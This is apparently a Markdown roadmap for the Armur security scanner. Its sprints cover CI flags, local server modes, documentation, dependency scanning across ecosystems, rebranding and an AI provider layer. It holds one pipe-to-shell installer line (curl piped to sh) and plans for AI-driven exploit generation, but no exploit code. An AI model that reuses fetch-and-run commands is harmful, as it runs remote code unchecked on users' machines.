- [x] `--fail-on-severity <level>` flag for `armur run` and `armur scan`:
  - If any finding at or above the given severity level is found: exit code 1
  - Valid levels: `critical`, `high`, `medium`, `low` (default: disabled)
- [x] `--min-severity <level>` flag: suppress display of findings below the given level
- [x] `--quiet` / `-q` flag: suppress all output except the summary card and exit code
- [x] Add a GitHub Actions workflow snippet to README showing a CI step that fails on HIGH findings

---

### Sprint 11 — Embedded Server & Zero-Infrastructure Mode [DONE]

Currently using `armur` requires Docker, Redis, and a separately running server. For local developer
use, the CLI should be able to start everything it needs without any external services.

#### 11.1 `armur serve` Command

- [x] Add `armur serve` as a top-level command that starts the Go HTTP server in the foreground
- [x] Accept `--port` flag (default: 4500) and `--redis-url` flag
- [x] On start: print `Armur server listening at http://localhost:4500 (press Ctrl+C to stop)`
- [x] Graceful shutdown on SIGINT/SIGTERM: drain in-flight Asynq tasks (with timeout), close Redis, exit

#### 11.2 Embedded Redis for Local Use

- [x] Evaluate and integrate `github.com/alicebob/miniredis` (in-process Redis-compatible server) for local mode
- [x] When `armur run` detects no external Redis and the user confirms local mode: start miniredis in-process
- [x] Local mode uses miniredis; production/Docker mode uses real Redis — controlled by `ARMUR_LOCAL=true` env var or `--local` flag

#### 11.3 Auto-Server in `armur run`

- [x] Before submitting a scan task, check if the configured API URL responds to `/health`
- [x] If unreachable and `--no-server` is not set: prompt "No server found. Start a local server? (Y/n)"
- [x] If confirmed: launch `armur serve` as a managed subprocess (store PID), wait for `/health` to respond (timeout 10s), then proceed with the scan
- [x] On scan completion: print "Local server still running (PID 12345). Stop it with: armur serve stop"
- [x] `armur serve stop` — send SIGTERM to the stored PID, wait for clean exit

#### 11.4 In-Process Scan Mode (No Server at All)

- [x] Add `--in-process` flag to `armur run` — runs the scan pipeline directly in the CLI process, no HTTP round-trip
- [x] The CLI imports the server's `internal/tasks` package and calls `RunSimpleScan` / `RunAdvancedScans` directly
- [x] Progress events emitted via the same `ProgressReporter` interface; TUI receives them through a local channel instead of SSE
- [x] This enables `armur run --in-process` to work with zero external dependencies (no Docker, no Redis, no server)
- [x] Requires the scan tools themselves to be installed on the host machine (show `armur doctor` output if any are missing)

---

### Sprint 12 — Community & Open Source Health [DONE]

#### 12.1 CI/CD for the Repo Itself
- [ ] Add `.github/workflows/test.yml` — run `go test ./...` on every PR
- [ ] Add `.github/workflows/lint.yml` — run `golangci-lint` on every PR
- [ ] Add `.github/workflows/docker.yml` — build and push Docker image on merge to main
- [ ] Add `.github/workflows/release.yml` — create GitHub Release with binaries on tag push
- [ ] Add `.github/workflows/security.yml` — run Armur on itself (dogfood)

#### 12.2 Cross-Platform Releases
- [ ] Add `goreleaser` configuration
- [ ] Build binaries for: `linux/amd64`, `linux/arm64`, `darwin/amd64`, `darwin/arm64`, `windows/amd64`
- [ ] Publish to GitHub Releases on every semver tag
- [ ] Add Homebrew formula (`brew install armur-ai/tap/armur`)
- [ ] Add `install.sh` one-liner script

#### 12.3 Versioning & Changelog
- [ ] Add semantic versioning (`MAJOR.MINOR.PATCH`)
- [ ] Embed version string in binary (`ldflags -X main.version`)
- [ ] Add `armur version` command
- [ ] Create `CHANGELOG.md` following Keep a Changelog format
- [ ] Automate changelog generation from conventional commits

#### 12.4 Issue & PR Templates
- [ ] Add `.github/ISSUE_TEMPLATE/bug_report.md`
- [ ] Add `.github/ISSUE_TEMPLATE/feature_request.md`
- [ ] Add `.github/ISSUE_TEMPLATE/new_tool_request.md`
- [ ] Add `.github/PULL_REQUEST_TEMPLATE.md` with checklist (tests, docs, changelog)
- [ ] Add `.github/SECURITY.md` for responsible disclosure process

#### 12.5 Contributing Guide
- [ ] Add `CONTRIBUTING.md` with:
  - [ ] How to set up dev environment without Docker
  - [ ] How to add a new tool integration (step-by-step with example)
  - [ ] How to add a new language
  - [ ] Code style and conventions
  - [ ] How to run tests
  - [ ] PR review process

#### 12.6 README Improvements
- [ ] Add build status badge (GitHub Actions)
- [ ] Add test coverage badge (Codecov or similar)
- [ ] Add Go Report Card badge
- [ ] Add Docker pulls badge
- [ ] Add license badge
- [ ] Add a demo GIF/video showing CLI in action
- [ ] Add "Supported Languages" table with tool counts per language
- [ ] Add "Quick Start" section that works in under 60 seconds

#### 12.7 Documentation Site
- [ ] Add "Getting Started" guide (5-minute quickstart)
- [ ] Add "Tool Reference" page documenting every integrated tool
- [ ] Add "CI/CD Integration" guides (GitHub Actions, GitLab CI, Jenkins, CircleCI)
- [ ] Add "Configuration Reference" (all `.armur.yml` options)
- [ ] Add "Plugin Development" guide
- [ ] Add "API Reference" (expand current Swagger docs)
- [ ] Deploy docs site to GitHub Pages or Vercel

---

### Sprint 13 — Documentation, README & CLI Reference [DONE]

Documentation is a first-class product. A developer who can't figure out how to use a tool in
5 minutes will not use it. This sprint treats every doc as a user-facing feature and ensures
Armur's documentation is best-in-class — better than Semgrep's, better than Snyk's.

#### 13.1 README Complete Rewrite

The current README is minimal. Rewrite it as the primary marketing and onboarding document.

- [ ] **Header section**:
  - Project logo (SVG, dark + light mode variants)
  - One-line tagline: "The open-source security scanner that covers everything — SAST, SCA, secrets, IaC, containers, and more."
  - Badge row: build status · test coverage · Go Report Card · Docker pulls · license · Armur score · latest release
  - Animated asciinema demo GIF embedded directly in the README (shows `armur run .` from zero to findings in 30 seconds)

- [ ] **Quick Start section** (works end-to-end in a single terminal session):
  ```bash
  # Install
  brew install armur-ai/tap/armur           # macOS/Linux
  # or: npm install -g @armur/cli           # via npm
  # or: curl -fsSL https://install.armur.ai | sh  # universal

  # Scan your project (no config needed)
  cd your-project
  armur run .

  # Scan a GitHub repository
  armur run https://github.com/org/repo

  # Check dependencies only
  armur run . --sca-only

  # Scan a Docker image
  armur scan --image nginx:latest
  ```

- [ ] **What Armur detects** — visual grid showing all categories with icons:
  | Category | Description | Example Tools |
  |----------|-------------|---------------|
  | SAST | Code vulnerabilities | semgrep, gosec, bandit, eslint |
  | SCA | Vulnerable dependencies | osv-scanner, govulncheck, cargo-audit |
  | Secrets | Hardcoded credentials | gitleaks, trufflehog |
  | IaC | Cloud misconfigs | tfsec, checkov, kube-linter |
  | Containers | Image vulnerabilities | trivy, grype |
  | DAST | Runtime exploitability | zap, nuclei |
  | Mobile | APK/IPA analysis | mobsf, apkleaks |

- [ ] **Language support matrix** — table of every supported language with tool names and coverage level (✓ full / ~ partial / planned):
  | Language | SAST | SCA | Secrets | Quality |
  |----------|------|-----|---------|---------|
  | Go | ✓ | ✓ | ✓ | ✓ |
  | Python | ✓ | ✓ | ✓ | ✓ |
  | ... etc |

- [ ] **Command reference summary** — all top-level commands in one table:
  | Command | Description |
  |---------|-------------|
  | `armur run [target]` | Scan with interactive TUI (recommended) |
  | `armur scan [target]` | Non-interactive scan |
  | `armur explain <id>` | AI explanation of a finding |
  | `armur fix <id>` | AI-generated code patch |
  | `armur doctor` | Check prerequisites |
  | `armur history` | Browse past scans |
  | `armur report <format>` | Generate reports |
  | `armur rules` | Manage detection rules |
  | `armur setup <integration>` | Configure integrations |
  | `armur serve` | Start local server |
  | `armur mcp` | Start MCP server for AI editors |

- [ ] **CI/CD integration snippets** — ready-to-paste code blocks for the 5 most common CI systems
- [ ] **How it works** — 4-step architecture diagram (ASCII art or SVG): Code → Tools → Results → Report
- [ ] **FAQ section** in the README (top 5 most-asked questions with short answers):
  - "Does Armur send my code anywhere?" → No. Everything runs locally by default.
  - "Do I need Docker?" → No. `armur run --in-process` works with zero infrastructure.
  - "How is Armur different from Semgrep/Snyk?" → One tool that covers all categories; MCP integration; better TUI.
  - "Can I use it in CI without a server?" → Yes. Use `armur scan --in-process`.
  - "Is it free?" → Yes. MIT license. Armur Cloud has a free tier for open source.
- [ ] **Contributing** and **License** sections at the bottom
- [ ] Keep README under 500 lines — use "Read the docs" links for detail rather than embedding everything

#### 13.2 CLI Command Reference (In-Tool `--help` + Online Docs)

Every command and flag must be self-documenting inside the tool itself, not just in external docs.

- [ ] **Rich `--help` output for every command** — include:
  - Short description (one line)
  - Full description (2–3 sentences explaining when to use this command)
  - At least 3 usage examples with real-world scenarios
  - Flag descriptions that explain *why* you'd use the flag, not just what it does
  - Link to online docs at the bottom: `Docs: https://docs.armur.ai/cli/<command>`

  Example for `armur run`:
  ```
  armur run — Scan a target with the full interactive TUI experience

  Opens a multi-step wizard to configure your scan, then shows a live progress
  dashboard while tools run, and an interactive results browser when complete.
  This is the recommended entry point for all new users.

  Usage:
    armur run [target] [flags]

  Arguments:
    target    File, directory, or git URL to scan.
              Defaults to the current directory if omitted.

  Examples:
    armur run                          # scan current directory (auto-detects everything)
    armur run ./my-project             # scan a specific directory
    armur run https://github.com/org/repo  # scan a remote repository
    armur run . --depth deep           # deep scan with all tools
    armur run . --diff HEAD~1          # scan only files changed since last commit
    armur run . --sca-only             # dependency vulnerabilities only
    armur run . --fail-on-severity high  # exit 1 if any HIGH+ findings (for CI)

  Flags:
    -d, --depth string          Scan depth: quick (default) or deep
    -l, --language string       Override auto-detected language
        --diff string           Only scan files changed since this git ref
        --sca-only              Run SCA (dependency) tools only
        --dast-url string       Also run DAST scan against this URL
        --fail-on-severity      Exit 1 if findings at or above this level
        --min-severity string   Hide findings below this level in output
        --output string         Output format: text (default), json, sarif
        --save-report           Save report to ~/.armur/reports/
        --in-process            Run without a server (no Docker/Redis needed)
        --offline               Disable all external network calls
        --watch                 Re-scan on file changes

  Docs: https://docs.armur.ai/cli/run
  ```

- [ ] Apply the same rich `--help` treatment to all commands:
  - [ ] `armur scan` — non-interactive version with all flags documented + examples
  - [ ] `armur explain <id>` — with example output shown in --help
  - [ ] `armur fix <id>` — document --apply, --pr, --verify flags with examples
  - [ ] `armur doctor` — explain what each check does in --help
  - [ ] `armur history` / `armur history show` / `armur history clear`
  - [ ] `armur compare <id1> <id2>`
  - [ ] `armur report html|csv|markdown|pdf|sarif|owasp|pci|cwe`
  - [ ] `armur rules list|install|update|remove|create|test|validate`
  - [ ] `armur setup <integration>`
  - [ ] `armur serve` / `armur serve stop`
  - [ ] `armur mcp` — explain MCP protocol and link to integration guides
  - [ ] `armur config` — document every key with allowed values and defaults
  - [ ] `armur init` — explain every generated .armur.yml field
  - [ ] `armur sla report|stats`
  - [ ] `armur debt`
  - [ ] `armur scorecard`
  - [ ] `armur sbom`
  - [ ] `armur badge generate`
  - [ ] `armur version --check`

- [ ] **`armur help` interactive browser** — when `armur help` is run with no args, show a
  Bubbletea-powered searchable list of all commands with descriptions; press Enter to expand
  the full help for that command

#### 13.3 docs.armur.ai — The Documentation Site

Full reference docs deployed at `docs.armur.ai`. Every page must be accurate, copyable, and searchable.

- [ ] **Getting Started** (5-minute quickstart):
  - [ ] Page 1: Installation (all methods: brew, npm, pip, curl, Docker, from source)
  - [ ] Page 2: First scan — `cd my-project && armur run .` with annotated screenshot of TUI output
  - [ ] Page 3: Understanding results — what each category means, what to fix first
  - [ ] Page 4: Setting up CI — paste-ready GitHub Actions snippet
  - [ ] Page 5: What's next — links to deeper topics

- [ ] **CLI Reference** (auto-generated from cobra's command tree + hand-written examples):
  - One page per top-level command
  - Each page: description, usage syntax, all flags with types/defaults, 5+ examples, related commands
  - Examples use real-world scenarios, not toy inputs
  - Include expected output (truncated) for each example

- [ ] **Configuration Reference** (`.armur.yml` full spec):
  - Every field documented with: type, default, description, example value, which sprint introduced it
  - Organized by section: `scan`, `tools`, `exclude`, `output`, `secrets`, `licenses`, `sla`, `never-allow`, `plugins`, `dast`, `ai`
  - Full annotated example `.armur.yml` at the top of the page
  - JSON Schema for `.armur.yml` published at `docs.armur.ai/schema/armur.json` (enables IDE autocompletion)

- [ ] **Tool Reference** — one page per integrated tool (18 initial + all additions):
  - Tool name, homepage, license, version requirement
  - What it detects (with example findings)
  - Which languages it supports
  - How Armur invokes it (the exact command)
  - How to install it manually (for non-Docker deployments)
  - Known limitations and false positive patterns
  - Link to the tool's own documentation

- [ ] **Language Support Guide** — one page per supported language:
  - Which tools run for this language in quick vs deep mode
  - Which SCA ecosystems are supported
  - Setup requirements (e.g. Java needs a JDK to compile before SpotBugs can run)
  - Example `.armur.yml` for this language
  - Sample findings from real projects in this language

- [ ] **IaC & Container Reference** — per-platform pages for Terraform, CloudFormation, Kubernetes, Helm, Dockerfile, etc.

- [ ] **Integrations** — per-integration pages:
  - Claude Code (MCP), Cursor, Windsurf, Claude Desktop
  - VS Code extension
  - GitHub Actions, GitLab CI, CircleCI, Jenkins, Azure DevOps, Bitbucket
  - Slack, Teams, Jira, Linear
  - Pre-commit hook, Husky
  - Armur Cloud

- [ ] **API Reference** — rendered OpenAPI spec:
  - Use Scalar (modern, beautiful) or Redoc for rendering
  - Every endpoint documented with: description, request body, response schema, example cURL call, example response
  - Include authentication section with example API key setup

- [ ] **Architecture Guide** (for contributors and self-hosters):
  - System diagram: CLI → API server → Asynq worker → tool executors → Redis → result store
  - How a scan flows through the system end-to-end
  - How the MCP server works
  - How SSE streaming works
  - Data model: Finding, ScanTask, ScanResult

- [ ] **Deployment Guide**:
  - Docker Compose (quickest — current method)
  - Docker Compose in production (with reverse proxy, TLS, secrets management)
  - Kubernetes deployment with Helm chart
  - Air-gapped / offline deployment
  - High-availability setup (multiple workers, Redis Sentinel)
  - Environment variable reference (every `ARMUR_*` env var documented)

- [ ] **Security Model** page — how Armur handles code security itself:
  - What runs locally vs what goes to cloud
  - How API keys are stored
  - Network calls made during a scan (with `--offline` flag behavior)
  - How to run in fully air-gapped mode
  - Armur's own security posture (we dogfood our own scanner)

#### 13.4 Cookbook — Common Workflows as Recipes

Short, copy-paste-ready guides for common real-world scenarios. Each recipe is one page.

- [ ] **Recipe: Secure a Node.js API before launch** — quick scan + SCA + secrets + DAST
- [ ] **Recipe: Add security to a Go microservice** — gosec + govulncheck + trivy in CI
- [ ] **Recipe: Scan a monorepo with 5 services** — `armur run --monorepo` walkthrough
- [ ] **Recipe: Block a PR with high security findings** — GitHub Actions gate setup
- [ ] **Recipe: Find leaked secrets in git history** — `armur scan --history` walkthrough
- [ ] **Recipe: Scan Terraform before `terraform apply`** — pre-apply security gate
- [ ] **Recipe: Audit your Docker image before pushing** — `armur scan --image` workflow
- [ ] **Recipe: Set up weekly security reports via Slack** — scheduled scan + Slack webhook
- [ ] **Recipe: Use Armur in Claude Code for secure coding** — MCP setup walkthrough
- [ ] **Recipe: Fix all CRITICAL findings with AI** — `armur fix --all --severity critical --apply`
- [ ] **Recipe: Migrate from Snyk to Armur** — Snyk → Armur workflow mapping
- [ ] **Recipe: Generate an SBOM for a compliance audit** — `armur sbom` + Dependency-Track
- [ ] **Recipe: Set up SLA enforcement for your team** — SLA config + Slack breach notifications
- [ ] **Recipe: Scan a smart contract before deployment** — Solidity + Slither + Mythril walkthrough

#### 13.5 Migration Guides

Developers switching from other tools need a bridge. These guides show exactly how to map
their existing workflow to Armur.

- [ ] **Migrating from Semgrep**:
  - Comparison table: Semgrep concepts → Armur equivalents
  - How to import your existing Semgrep rules into Armur (`armur rules import --from semgrep`)
  - Feature coverage comparison (what Armur adds that Semgrep doesn't: SCA, secrets, IaC, TUI)
  - Side-by-side CLI comparison: `semgrep scan .` vs `armur run .`

- [ ] **Migrating from Snyk**:
  - Snyk vs Armur: what Snyk does that Armur covers, and vice versa
  - Mapping Snyk severity levels to Armur severity levels
  - How to reproduce Snyk's `snyk test` and `snyk code test` with Armur
  - Cost comparison: Snyk Enterprise ($) vs Armur (free + Armur Cloud)

- [ ] **Migrating from SonarQube**:
  - Mapping SonarQube quality gates → Armur `fail-on-severity` and `never-allow`
  - How to replicate SonarQube's language coverage with Armur
  - Self-hosted comparison: SonarQube (JVM + Elasticsearch) vs Armur (Go + Redis — much simpler)

- [ ] **Migrating from Trivy (standalone)**:
  - Trivy is already integrated inside Armur — show how `armur run .` supersedes `trivy fs .`
  - How Armur adds SAST + secrets + IaC on top of what Trivy provides

- [ ] **Migrating from Checkov**:
  - Checkov is already integrated inside Armur — show how `armur run .` supersedes `checkov -d .`
  - What Armur adds: SAST, SCA for application code, secrets, TUI, reports

#### 13.6 Troubleshooting Guide

- [ ] **Common error messages** — every error Armur can print, with cause and fix:
  - "Connection refused: http://localhost:4500" → server not running, use --in-process
  - "Tool not found: gosec" → install instructions per OS
  - "Language detection failed" → how to specify --language manually
  - "Redis connection failed" → Redis not running, use embedded mode
  - "Scan timeout" → increase TOOL_TIMEOUT_SECONDS, or use --depth quick
  - "Permission denied cloning repository" → SSH key or token setup instructions

- [ ] **Performance troubleshooting**:
  - Scan taking > 5 minutes → which tools are slow and why, how to skip them
  - High memory usage → MAX_TOOL_CONCURRENCY tuning
  - Disk space issues → temp directory cleanup instructions

- [ ] **CI/CD troubleshooting**:
  - Why GitHub Actions fails on rate limits (solution: cache tool installations)
  - Why SARIF upload fails (common: file size limit, path issues)
  - Why the scan works locally but fails in CI (environment differences)

- [ ] **False positive management**:
  - How to identify false positives vs genuine findings
  - How to suppress with inline comments vs `.armur.yml` vs global suppression
  - How to report a false positive to the Armur team

#### 13.7 CHANGELOG.md & Release Notes

- [ ] Create `CHANGELOG.md` at repo root following [Keep a Changelog](https://keepachangelog.com) format:
  ```markdown
  # Changelog

  All notable changes to Armur Code Scanner are documented here.
  Format: Keep a Changelog (https://keepachangelog.com)
  Versioning: Semantic Versioning (https://semver.org)

  ## [Unreleased]
  ### Added
  - ...

  ## [1.0.0] — 2026-XX-XX
  ### Added
  - Initial release with Go, Python, and JavaScript/TypeScript support
  - 18 integrated security tools
  - REST API + Asynq worker architecture
  ...
  ```
- [ ] Automate CHANGELOG generation from conventional commits using `git-cliff` or `release-please`
- [ ] Each GitHub Release includes:
  - What's new (bullet points from CHANGELOG)
  - Breaking changes (prominently highlighted)
  - Migration steps for breaking changes
  - SHA256 checksums for all binaries
  - Docker image digest

#### 13.8 In-Code Documentation Standards

These apply to all code written going forward, ensuring future contributors understand the codebase.

- [ ] Every exported function in `internal/tools/` must have a godoc comment explaining:
  - What the tool does
  - What it returns
  - What errors it can return
  - Example: `// RunGosec runs the gosec static analyzer against the given directory and returns categorized security findings. Returns ErrToolNotFound if gosec is not installed.`
- [ ] Every tool wrapper file must have a package-level comment with:
  - Tool name and homepage URL
  - Version requirement (minimum version tested)
  - Installation instructions for the tool itself
- [ ] `internal/models/finding.go` — every field of the `Finding` struct must have an inline comment
- [ ] `internal/api/types.go` — every API request/response struct field must have a `json` tag + godoc comment (used for OpenAPI generation)
- [ ] Run `golint ./...` and `godoc ./...` in CI to enforce comment coverage
- [ ] Generate HTML godoc and publish to `pkg.go.dev/github.com/armur-ai/armur-codescanner`

---

### Sprint 14 — Software Composition Analysis: All Ecosystems [DONE]

Expand SCA coverage from the current (Go modules + generic OSV) to every major package ecosystem.
Goal: comprehensive dependency vulnerability detection regardless of language.

#### 14.1 Package Ecosystem Coverage Matrix

For each ecosystem: detect the manifest/lockfile, parse direct + transitive dependencies, query OSV API for CVEs.

- [x] **npm / Yarn / pnpm** (JavaScript/TypeScript):
  - Detect: `package.json`, `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`
  - Run: `npm audit --json` or `osv-scanner --lockfile=package-lock.json:npm`
  - Parse: vulnerability ID, package name, installed version, patched version, CVSS
- [x] **pip / Poetry / Pipenv / PDM / uv** (Python):
  - Detect: `requirements.txt`, `Pipfile.lock`, `poetry.lock`, `pdm.lock`, `uv.lock`, `pyproject.toml`
  - Run: `osv-scanner --lockfile=requirements.txt:pip`; also `pip-audit --format json`
  - Add `pip-audit` integration (Google's official Python auditing tool)
- [x] **Go modules** (already have osv-scanner + govulncheck — improve):
  - Detect: `go.mod`, `go.sum`
  - Run both govulncheck (reachability-aware) and osv-scanner (all deps including non-reachable)
  - Display reachability status in findings: "reachable: yes | no | unknown"
- [x] **Cargo** (Rust):
  - Detect: `Cargo.toml`, `Cargo.lock`
  - Run: `cargo audit --json`
- [x] **Maven / Gradle** (Java/Kotlin/Scala):
  - Detect: `pom.xml`, `build.gradle`, `build.gradle.kts`, `gradle.lockfile`
  - Run: `mvn dependency:tree -DoutputType=dot` + osv-scanner; or OWASP Dependency-Check
- [x] **RubyGems** (Ruby):
  - Detect: `Gemfile.lock`
  - Run: `bundle-audit check --json`
- [x] **Composer** (PHP):
  - Detect: `composer.lock`
  - Run: `local-php-security-checker --format=json`
- [x] **NuGet** (C#/.NET):
  - Detect: `packages.config`, `packages.lock.json`, `*.csproj` with `<PackageReference>`
  - Run: `dotnet list package --vulnerable --include-transitive --format json`
- [x] **CocoaPods** (iOS/macOS):
  - Detect: `Podfile.lock`
  - Run: `osv-scanner --lockfile=Podfile.lock:cocoapods`
- [x] **Swift Package Manager**:
  - Detect: `Package.resolved`
  - Run: `osv-scanner --lockfile=Package.resolved:swift`
- [x] **pub** (Dart/Flutter):
  - Detect: `pubspec.lock`
  - Run: `dart pub audit` (official Dart advisory checking)
- [x] **Hex** (Elixir):
  - Detect: `mix.lock`
  - Run: `mix hex.audit` — parse output for vulnerable packages
- [x] **Conan** (C/C++):
  - Detect: `conanfile.txt`, `conanfile.py`, `conan.lock`
  - Query OSV API with package names and versions
- [x] **sbt** (Scala):
  - Detect: `build.sbt`, `project/plugins.sbt`
  - Run: `sbt dependencyUpdates` + OSV API query

#### 14.2 OSV API Integration (Unified Vulnerability Database)

- [x] Implement a shared `internal/sca/osv.go` OSV API client:
  - `BatchQuery(pkgs []Package) ([]Vulnerability, error)` — uses OSV `/v1/querybatch` endpoint
  - Cache results in Redis for 1 hour to avoid redundant API calls
  - Rate-limit: max 100 packages per batch request
- [x] Map OSV vulnerability severities using CVSS v3 base score: ≥9.0 → Critical, ≥7.0 → High, ≥4.0 → Medium, <4.0 → Low
- [x] Enrich each SCA finding with: CVE IDs, GHSA IDs, PURL, affected version range, fixed version, CVSS score, summary

---

## Phase 3: The Agent Edge (v2.0) — Sprints 15–21

The transformation from code scanner to security agent. AI intelligence, sandboxed DAST,
exploit simulation, attack path analysis, autonomous PR review, and MCP integration for
AI coding assistants. This is what makes Armur fundamentally different from every other scanner.

---

### Sprint 15 — Rebranding [DONE]: From Code Scanner to Personal Security Agent

The fundamental identity shift. Armur is no longer just a "code scanner" — it is a **Personal
Security Agent for developers** that continuously watches, tests, and protects code. This sprint
touches naming, messaging, packaging, CLI UX, and structural architecture to align with the new
positioning. The key insight: AI-generated code is becoming the norm, and developers need an agent
that automatically validates every change — not a tool they remember to run manually.

#### 15.1 Name & Identity

- [x] Rename the project from "Armur Code Scanner" to **"Armur — Personal Security Agent"**
  - GitHub repo description: "Your personal security agent. SAST + DAST + exploit simulation + attack path analysis — all automated."
  - Short form for docs and marketing: "Armur Security Agent" or just "Armur"
  - CLI binary stays `armur` (no change needed)
- [x] Update `cmd/server/main.go` Swagger title: `Armur Security Agent API`
- [x] Update `cli/cmd/root.go` description:
  ```go
  Short: "Armur — Your Personal Security Agent",
  Long:  "Armur is a personal security agent that reads your code, runs it in a sandbox, simulates attacks, and shows you exactly how to fix what it finds.",
  ```
- [x] Update all `--help` text across every command to use "agent" language instead of "scanner"
- [x] Create `assets/logo/` with new logo variants (text-only, icon, banner) for README and docs
- [x] Update `IMPROVEMENTS.md` header to "Armur Security Agent — Improvement Roadmap"

#### 15.2 Go Module & Package Naming

- [x] Rename Go module from `armur-codescanner` to `armur` in `go.mod`
- [x] Rename CLI module from `armur-cli` to `armur-cli` (keep as-is — it's fine)
- [x] Update all internal import paths: `armur-codescanner/internal/...` → `armur/internal/...`
- [x] Update Docker image names: `armur/scanner` → `armur/agent` (keep `armur/scanner` as alias)
- [x] Update GitHub Actions references: `armur-ai/armur-scan-action` → `armur-ai/armur-action`

#### 15.3 CLI Experience: Agent-First UX

- [x] New default behavior: `armur` with no args → runs the security agent in watch mode for cwd
  - Performs initial scan, then watches for file changes
  - On each change: re-scans affected files, shows delta findings
  - Agent stays running until Ctrl+C
- [x] `armur scan` still works as a one-shot command (backwards compatible)
- [x] `armur agent` — explicit alias for the always-on agent mode
- [x] `armur review <pr-url>` — review a specific PR (Sprint 20)
- [x] New CLI banner on startup:
  ```
  ╔═══════════════════════════════════════════════╗
  ║  ARMUR — Personal Security Agent              ║
  ║  Watching: ./my-project (Go)                  ║
  ║  Mode: SAST + SCA | Press 'd' for DAST       ║
  ╚═══════════════════════════════════════════════╝
  ```
- [x] All output uses "agent" framing: "Armur found 3 issues" not "Scan found 3 issues"

#### 15.4 Messaging & Positioning Throughout Codebase

- [x] Update every user-facing string that says "scan" to use "analysis" or "security check" where appropriate
  - API responses: `"status": "analyzing"` alongside existing `"status": "pending"` for backwards compat
  - CLI output: "Armur is analyzing your code..." instead of "Waiting for scan to complete..."
- [x] Update error messages to be agent-contextual: "Armur couldn't reach the server" not "Error making API request"
- [x] Update all `.armur.yml` documentation to frame as "agent configuration" not "scan configuration"
- [x] Add a `--why` flag to every finding display: shows a one-sentence explanation of why this matters specifically for AI-generated code

#### 15.5 Structural Preparation

- [x] Add `Finding.Source` field across the pipeline: `"sast"` | `"dast"` | `"sca"` | `"secrets"` | `"iac"` | `"exploit"` | `"attack_path"`
- [x] Add `Finding.Confirmed` boolean: `true` when DAST or exploit simulation has verified the finding
- [x] Add `ScanMode` enum: `"sast_only"` | `"sast_sca"` | `"full_agent"` (SAST + DAST + exploit)
- [x] Extend `.armur.yml` schema with agent config section:
  ```yaml
  agent:
    mode: full            # sast_only | sast_sca | full_agent
    auto_dast: true       # automatically run DAST when a runnable app is detected
    auto_exploit: false   # automatically simulate exploits (opt-in, requires sandbox)
    watch: true           # watch for file changes and re-analyze
    pr_review: true       # automatically review PRs when integrated with GitHub
  ```
- [x] Add `internal/agent/` package as the top-level orchestrator that coordinates SAST → DAST → Exploit → Attack Path

---

### Sprint 16 — AI Intelligence Layer [DONE] (Claude API + Local LLMs)

Every intelligent feature in Armur (tech stack detection, exploit generation, attack path reasoning,
PR review, explain, fix, false positive reduction) requires an AI backbone. This sprint builds the
pluggable AI integration layer that supports Claude API, local LLMs via Ollama, and user choice.

#### 16.1 AI Provider Abstraction

- [x] Create `internal/ai/provider.go` — defines the provider interface:
  ```go
  type AIProvider interface {
      Complete(ctx context.Context, prompt string, opts CompletionOpts) (string, error)
      Stream(ctx context.Context, prompt string, opts CompletionOpts) (<-chan string, error)
      Name() string
      Available() bool
  }

  type CompletionOpts struct {
      MaxTokens   int
      Temperature float64
      SystemPrompt string
  }
  ```
- [x] Implement `internal/ai/claude.go` — Claude API provider:
  - Uses `github.com/anthropic-ai/anthropic-sdk-go` (official Go SDK)
  - Default model: `claude-sonnet-4-6` for speed; `claude-opus-4-6` for complex reasoning (exploit gen)
  - Reads API key from: `ANTHROPIC_API_KEY` env var → `~/.armur/config.json` → prompt user
- [x] Implement `internal/ai/ollama.go` — Ollama local LLM provider:
  - Connects to Ollama HTTP API at `http://localhost:11434`
  - Default model: `llama3.1:8b` (good balance of speed and quality)
  - Auto-detect if Ollama is running; if not, offer to install it
- [x] Implement `internal/ai/openai_compat.go` — any OpenAI-compatible API endpoint (LM Studio, vLLM, Together.ai, Groq):
  - Config: `ARMUR_LLM_BASE_URL`, `ARMUR_LLM_API_KEY`, `ARMUR_LLM_MODEL`
- [x] Implement `internal/ai/router.go` — provider router:
  - User configures preferred provider in `~/.armur/config.json` or `.armur.yml`
  - Fallback chain: user preference → Claude API (if key available) → Ollama (if running) → offline mode (no AI)
  - Each AI-powered feature specifies minimum capability level; router picks the best available provider

#### 16.2 User Configuration & Key Management

- [x] `armur config set ai-provider claude` / `armur config set ai-provider ollama` / `armur config set ai-provider auto`
- [x] `armur config set anthropic-api-key <key>` — securely stores the Claude API key
  - Key stored in `~/.armur/credentials` with `0600` permissions (not in `config.json`)
  - Support `ANTHROPIC_API_KEY` env var as override
- [x] `armur config set ollama-model <model>` — configure which Ollama model to use (default: `llama3.1:8b`)
- [x] `armur config set ollama-url <url>` — for remote Ollama instances (default: `http://localhost:11434`)
- [x] Add `.armur.yml` AI configuration:
  ```yaml
  ai:
    provider: auto          # claude | ollama | auto | none
    claude:
      model: claude-sonnet-4-6
      # API key read from env or ~/.armur/credentials — never stored in .armur.yml
    ollama:
      model: llama3.1:8b
      url: http://localhost:11434
    features:
      explain: true         # enable armur explain
      fix: true             # enable armur fix
      fp_filter: false      # enable false positive filtering
      exploit_gen: true     # enable exploit generation (requires claude or large local model)
      tech_detection: true  # enable AI-powered tech stack detection for DAST
  ```

#### 16.3 Local LLM Bootstrap

- [x] `armur setup ai` — interactive wizard for AI setup:
  1. "How would you like to power Armur's AI features?"
     - "Use Claude API (best quality, requires API key)" → prompt for key
     - "Use a local LLM via Ollama (free, private, runs on your machine)" → check/install Ollama
     - "No AI features (Armur works fine without them, just no explain/fix/exploit features)"
  2. If Ollama selected:
     - Check if Ollama is installed; if not: `brew install ollama` (macOS) or provide install link
     - Check if the selected model is downloaded; if not: `ollama pull llama3.1:8b`
     - Run a quick test prompt to verify the model works
     - Save config
  3. Print summary: "AI configured! Armur will use [Claude API / Ollama llama3.1:8b] for intelligent features."
- [x] `armur doctor` extended: check AI provider health (API key valid, Ollama reachable, model loaded)

#### 16.4 AI-Powered Tech Stack Detection

- [x] Create `internal/ai/techdetect.go` — uses AI to analyze a project and determine:
  - Primary language and framework (e.g., "Go + Gin", "Python + FastAPI", "Node.js + Express")
  - Build system (go build, npm, pip, cargo, maven, gradle)
  - How to build the project (specific commands)
  - How to run the project (specific commands, ports, env vars needed)
  - Database dependencies (PostgreSQL, MySQL, Redis, MongoDB, etc.)
  - External service dependencies (S3, Stripe, Twilio, etc.)
- [x] Input: project file listing + key file contents (go.mod, package.json, Dockerfile, docker-compose.yml, README)
- [x] Output: structured `TechProfile` JSON used by the DAST sandbox engine (Sprint 17)
- [x] Fallback when no AI available: heuristic-based detection from file extensions and manifests (already exists, just less smart about framework/port detection)

